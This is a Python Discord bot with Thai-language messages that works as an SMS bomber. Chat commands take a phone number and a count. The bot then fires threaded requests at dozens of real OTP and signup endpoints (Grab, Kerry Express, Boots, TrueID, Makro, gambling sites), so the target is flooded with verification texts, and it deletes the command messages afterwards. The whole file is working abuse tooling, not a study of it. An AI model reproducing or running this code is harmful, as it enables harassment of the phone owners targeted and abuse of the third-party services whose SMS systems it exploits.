import discord,time
from requests import post, Session
from re import search
from random import choice
from string import ascii_uppercase, digits
from concurrent.futures import ThreadPoolExecutor
from discord.ext import commands

PREFIX = '!v' #คำนำหน้าตอนใช้คำสั่ง
TOKEN = 'token' #token ของบอท
SCK = 50
LIMIT = 250 #จำนวนสูงสุดที่ใส่ได้ต่อการยิง 1 ครั้ง

bot = commands.Bot(command_prefix=PREFIX)
bot.remove_command("help")

def randomString(N):
    return ''.join(choice(ascii_uppercase + digits) for _ in range(N))

threading = ThreadPoolExecutor(max_workers=int(100000))
useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40"

def sck1(phone):
    post("https://api.myfave.com/api/fave/v3/auth",headers={"client_id": "dd7a668f74f1479aad9a653412248b62", "User-Agent": useragent},json={"phone": f"66{phone}"})

def sck2(phone):
    post("https://u.icq.net/api/v65/rapi/auth/sendCode", headers={"User-Agent": useragent}, json={"reqId":"39816-1633012470","params":{"phone": f"+66{phone[1:]}","language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})

def sck3(phone):
    post("https://api2.1112.com/api/v1/otp/create", headers={"User-Agent": useragent}, data={'phonenumber': phone,'language': "th"})

def sck4(phone):
    post("https://ecomapi.eveandboy.com/v10/user/signup/phone", headers={"User-Agent": useragent}, data={"phone": phone,"password":"123456789Az"})

def sck5(phone):
    post("https://api.1112delivery.com/api/v1/otp/create", headers={"User-Agent": useragent}, data={'phonenumber': phone,'language': "th"})

def sck6(phone):
    post("https://gccircularlivingshop.com/sms/sendOtp", headers={"User-Agent": useragent}, json={"grant_type":"otp","username": f"+66{phone[1:]}","password":"","client":"ecommerce"})

def sck7(phone):
    post("https://shop.foodland.co.th/login/generation", headers={"User-Agent": useragent}, data={"phone": phone})

def sck8(phone):
    post("https://api-shop.diorbeauty.hk/api/th/ecrm/sms_generate_code", headers={"User-Agent": useragent}, data={"number": f"+66{phone[1:]}"})

def sck9(phone):
    post("https://api.sacasino9x.com/api/RegisterService/RequestOTP", headers={"User-Agent": useragent}, json={"Phone": phone})

def sck10(phone):
    post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", headers={"User-Agent": useragent}, data={"phone": phone})

def sck11(phone):
    post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", headers={"User-Agent": useragent}, data={"phone": phone})

def sck12(phone):
    post("https://partner-api.grab.com/grabid/v1/oauth2/otp", headers={"User-Agent": useragent}, json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": f"66{phone[1:]}"})

def sck13(phone):
    post("https://api.scg-id.com/api/otp/send_otp", headers={"User-Agent": useragent, "Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})

def sck14(phone):
    session = Session()
    searchItem = session.get("https://www.shopat24.com/register/").text
    ReqTOKEN = search("""<input type="hidden" name="_csrf" value="(.*)" />""", searchItem).group(1)
    session.post("https://www.shopat24.com/register/ajax/requestotp/", headers={"User-Agent": useragent, "content-type": "application/x-www-form-urlencoded; charset=UTF-8","X-CSRF-TOKEN": ReqTOKEN}, data={"phoneNumber": phone})

def sck15(phone):
    post("https://prettygaming168-api.auto888.cloud/api/v3/otp/send", headers={"User-Agent": useragent}, data={"tel": phone,"otp_type":"register"})

def sck16(phone):
    post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", headers={"User-Agent": useragent}, json={"on":{"value": phone,"country":"66"},"type":"mobile"})

def sck17(phone):
    post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}", headers={"User-Agent": useragent})

def sck18(phone):
    post("https://graph.firster.com/graphql",headers={"User-Agent": useragent, "organizationcode": "lifestyle","content-type": "application/json"}, json={"operationName":"sendOtp","variables":{"input":{"mobileNumber": phone[1:],"phoneCode":"THA-66"}},"query":"mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"})

def sck19(phone):
    post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661", headers={"User-Agent": useragent}, json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone": f"+66{phone[1:]}","type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName": randomString(10)}})

def sck20(phone):
    post("https://store.boots.co.th/api/v1/guest/register/otp", headers={"User-Agent": useragent}, json={"phone_number":f"+66{phone[1:]}"})

def sck21(phone):
    post("https://m.lucabet168.com/api/register-otp", headers={"User-Agent": useragent} ,json={"brands_id":"609caede5a67e5001164b89d","agent_register":"60a22f7d233d2900110070d7","tel": phone})

def sck22(phone):
    session = Session()
    ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": useragent}).text
    session.post("https://srfng.ais.co.th/login/sendOneTimePW", data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={"User-Agent": useragent,"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''})

def sck23(phone):
    post(url="https://www.cpffeedonline.com/Customer/RegisterRequestOTP", data={"mobileNumber":f"0{phone}"})

def sck24(phone):
    post(url="https://www.tgfone.com/index.php/signin/otp_chk", data={"mobile":f"0{phone}"})

def sck25(phone):
    post("https://api2.1112.com/api/v1/otp/create", json={"phonenumber":f"0{phone}","language":"th"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def sck26(phone):
    post("https://unacademy.com/api/v3/user/user_check/", json={"phone":f"0{phone}","country_code":"TH"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def sck27(phone):
    post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-0{phone}")

def sck28(phone):
    post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register", json={"username": f"0{phone}","password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def sck29(phone):
    post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", data={"phone": f"0{phone}"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def sck30(phone):
    post("https://www.berlnw.com/reservelogin", data={"p_myreserve": f"0{phone}"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def sck31(phone):
    post("https://www.kickoff28.com/action.php?mode=PreRegister", data={"tel": f"0{phone}"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def sck32(phone):
    post("https://1ufabet.com/_ajax_/request-otp", data={"request_otp[phoneNumber]": f"0{phone}", "request_otp[termAndCondition]": "1", "request_otp[_token]": "XBNcvQIzJK1pjh_2T0BBzLiDa6vSivktDN317mbw3ws"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def sck33(phone):
    post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"1111a1111A","name":"djdssjssk","provinceCode":"74","districtCode":"970","subdistrictCode":"8654","zipcode":"94140","siebelCustomerTypeId":"710","locale":"th_TH"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
    
def sck34(phone):
         post("https://vaccine.trueid.net/vacc-verify/api/getotp",json={"msisdn":phone,"function":"enroll"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})   

def startall(phone, amount):
    for _ in range(amount):
        threading.submit(sck1, phone)
        threading.submit(sck2, phone)
        threading.submit(sck3, phone)
        threading.submit(sck4, phone)
        threading.submit(sck5, phone)
        threading.submit(sck6, phone)
        threading.submit(sck7, phone)
        threading.submit(sck8, phone)
        threading.submit(sck9, phone)
        threading.submit(sck10, phone)
        threading.submit(sck11, phone)
        threading.submit(sck12, phone)
        threading.submit(sck13, phone)
        threading.submit(sck14, phone)
        threading.submit(sck15, phone)
        threading.submit(sck16, phone)
        threading.submit(sck17, phone)
        threading.submit(sck18, phone)
        threading.submit(sck19, phone)
        threading.submit(sck20, phone)
        threading.submit(sck21, phone)
        threading.submit(sck22, phone)
        threading.submit(sck23, phone)
        threading.submit(sck24, phone)
        threading.submit(sck25, phone)
        threading.submit(sck26, phone)
        threading.submit(sck27, phone)
        threading.submit(sck28, phone)
        threading.submit(sck29, phone)
        threading.submit(sck30, phone)
        threading.submit(sck31, phone)
        threading.submit(sck33, phone)
        threading.submit(sck32, phone)
        threading.submit(sck33, phone)

def nocz(phonee):
    post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661", headers={"User-Agent": useragent}, json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone": f"+66{phonee[1:]}","type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName": randomString(10)}})
    
def ht(phonee):
         post("https://vaccine.trueid.net/vacc-verify/api/getotp",json={"msisdn":phonee,"function":"enroll"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})    
def hy(phonee):
    post("https://topping.truemoveh.com/api/get_request_otp",data={"mobile_number": phonee},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
    
def hj(phonee):
    post("https://www.monomax.me/api/v2/signup/telno",json ={"password":"12345678+","telno": phonee, },headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}) 
 
def fuck(phonee):
    post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phonee,"password":"1111a1111A","name":"djdssjssk","provinceCode":"74","districtCode":"970","subdistrictCode":"8654","zipcode":"94140","siebelCustomerTypeId":"710","locale":"th_TH"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
 
def nocza(phonee, aamout):
    for _ in range(aamout):
        threading.submit(fuck, phonee)
        threading.submit(ht, phonee)
        threading.submit(hy, phonee)   
        threading.submit(hj, phonee)
        threading.submit(nocz, phonee)       
                       



@bot.event
async def on_command_error(ctx, error):
    print(str(error))

@bot.event
async def on_connect():
    print(f"Login as : {bot.user.name}#{bot.user.discriminator}")

@bot.command()
async def help(ctx):
    await ctx.send(f"> **คำสั่งยิงเบอร์** | {PREFIX}sms [เบอร์] [จำนวน1- {str(LIMIT)}ครั้ง]",delete_after=15)
    await ctx.send(f"> **คำสั่งยิง รัวๆ 5api** | {PREFIX}er [เบอร์] [จำนวน1- {str(SCK)}ครั้ง]",delete_after=15)
    await ctx.send(f"> =chk  เช็คสถานะ SpamerBOT",delete_after=15)
    await ctx.message.delete()
    
@bot.command()
async def chk(ctx):
    await ctx.send(f"สถานะ: SMSALL [•√]",delete_after=20)
    await ctx.send(f"สถานะ: 5api [•√]",delete_after=20)
    
    await ctx.message.delete()


@bot.command()
async def sms(ctx, phone=None, amount=None):
    if (str(ctx.message.channel.id) == '927941187904626729'):
        if (phone == None or amount == None):
            await ctx.send("> กรุณาใส่ข้อมูลให้ครบถ้วน",delete_after=15)
            await ctx.message.delete()
            
        else:
            try:
                amount = int(amount)
                if (amount > LIMIT):
                    await ctx.send(f"> กรุณาใส่จำนวนไม่เกิน {str(LIMIT)}",delete_after=15)
                    await ctx.message.delete()

                else:
                    await ctx.send(f"> เริ่มยิงไปที่เบอร์ **{phone}** แล้ว | จำนวน **{amount}**ครั้ง",delete_after=15)
                    startall(phone, amount)
                    await ctx.message.delete()

            except:
                await ctx.send("> คุณใส่จำนวนไม่ถูกต้อง",delete_after=15)
                await ctx.message.delete()

                
    else:
        await ctx.send("> โปรดใช้คำสั่งในห้องที่ถูกต้อง",delete_after=15)
        await ctx.message.delete()
        
        
@bot.command()
async def er(ctx, phonee=None, aamount=None):
    if (str(ctx.message.channel.id) == '927941187904626729'):
        if (phonee == None or aamount == None):
            await ctx.send("> กรุณาใส่ข้อมูลให้ครบถ้วน",delete_after=15)
            await ctx.message.delete()
            
        else:
            try:
                aamount = int(aamount)
                if (aamount > SCK):
                    await ctx.send(f"> กรุณาใส่จำนวนไม่เกิน {str(SCK)}",delete_after=15)
                    await ctx.message.delete()

                else:
                    await ctx.send(f"> เริ่มยิงไปที่เบอร์ **{phonee}** แล้ว | จำนวน **{aamount}**ครั้ง",delete_after=15)
                    nocza(phonee, aamount)
                    await ctx.message.delete()

            except:
                await ctx.send("> คุณใส่จำนวนไม่ถูกต้อง",delete_after=15)
                await ctx.message.delete()

                
    else:
        await ctx.send("> โปรดใช้คำสั่งในห้องที่ถูกต้อง",delete_after=15)
        await ctx.message.delete()

        


bot.run(TOKEN, reconnect=True)